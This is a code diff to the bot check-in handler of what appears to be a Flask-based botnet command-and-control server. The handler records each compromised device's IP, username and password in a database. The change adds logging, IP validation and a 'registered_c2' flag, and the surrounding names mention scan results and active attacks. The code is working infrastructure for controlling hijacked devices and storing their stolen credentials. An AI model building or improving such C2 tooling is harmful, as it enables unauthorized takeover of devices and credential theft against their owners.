@@ -761,31 +761,56 @@ HTML_TEMPLATE = '''
 def handle_bot_checkin(db_manager, data):
     """Handle bot checkin and registration"""
     try:
+        if not data:
+            logging.error("Empty data received in bot checkin")
+            return jsonify({'error': 'No data provided'}), 400
+            
         ip = data.get('ip')
         username = data.get('username')
         password = data.get('password')
         status = data.get('status', 'online')
         device_type = data.get('device_type', 'unknown')
         
+        logging.info(f"Bot checkin attempt: IP={ip}, Username={username}, Status={status}, Type={device_type}")
+        
         if not all([ip, username, password]):
-            logging.error(f"Missing required data in bot checkin: {data}")
-            return jsonify({'error': 'Missing required data'}), 400
+            missing_fields = []
+            if not ip: missing_fields.append('ip')
+            if not username: missing_fields.append('username')
+            if not password: missing_fields.append('password')
             
-        # Register the device in the database
+            error_msg = f"Missing required data in bot checkin: {missing_fields}"
+            logging.error(error_msg)
+            return jsonify({'error': error_msg}), 400
+            
+        # Validate IP format (basic validation)
+        import re
+        if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
+            logging.error(f"Invalid IP format: {ip}")
+            return jsonify({'error': f'Invalid IP format: {ip}'}), 400
+            
+        # Register the device in the database with detailed logging
+        logging.info(f"Attempting to register device {ip} in database...")
         success = db_manager.register_device(ip, username, password, device_type)
         
         if not success:
-            return jsonify({'error': 'Failed to register device'}), 500
+            error_msg = f"Database registration failed for device {ip}"
+            logging.error(error_msg)
+            return jsonify({'error': error_msg}), 500
             
+        logging.info(f"[SUCCESS] Device {ip} registered successfully with type {device_type}")
         return jsonify({
             'status': 'success',
             'message': f'Device {ip} registered successfully',
-            'device_type': device_type
+            'device_type': device_type,
+            'registered_c2': True,
+            'timestamp': data.get('timestamp')
         })
         
     except Exception as e:
-        logging.error(f"Error in bot checkin: {e}")
-        return jsonify({'error': str(e)}), 500
+        error_msg = f"Error in bot checkin: {str(e)}"
+        logging.error(error_msg)
+        return jsonify({'error': error_msg}), 500
 
 def render_dashboard(devices, scan_results, active_sessions, active_attacks=None):
     """Render the dashboard with the provided data"""
